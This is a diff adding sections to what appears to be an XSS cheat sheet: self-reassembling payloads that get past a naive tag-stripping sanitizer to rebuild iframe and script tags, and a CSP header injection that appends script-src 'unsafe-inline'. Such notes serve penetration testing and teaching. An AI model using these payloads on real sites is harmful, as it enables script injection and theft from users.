@@ -97,8 +97,23 @@ alert`1`            # Backtick call
 onerror=alert;throw 1  # Parentheses bypass
 ```
 
+### Sanitizer Bypass (self-reassembling payload)
+When a single global `replace` strips `<tag` + the following non-word run + one word char, make the removed span straddle a duplicated character so the survivors reassemble:
+```html
+<<a>iiframe src="javascript:alert(`xss`)">   # -> <iframe src="javascript:alert(`xss`)">
+<<a>sscript>alert(`xss`)</script>           # -> <script>alert(`xss`)</script>
+```
+The leading `<` is skipped (next char is `<`, not a word char), the `<a>i` / `<a>s` span is consumed, and nothing after it matches.
+
 ### CSP Bypass Indicators
 Check header for: unsafe-inline, unsafe-eval, wildcard sources, JSONP endpoints, CDN with user content.
+
+### CSP Header Injection
+When a user-controlled value is interpolated into the emitted CSP directive (for example a profile-image URL concatenated into `img-src`), inject a second, permissive directive through the reflected value:
+```
+https://example.com/100.png; script-src 'unsafe-inline'
+```
+Confirm the emitted header now carries the injected directive before combining it with a script payload. A second `script-src 'unsafe-inline'` in the response header is the bypass evidence.
 
 ## DOM-Based XSS
 
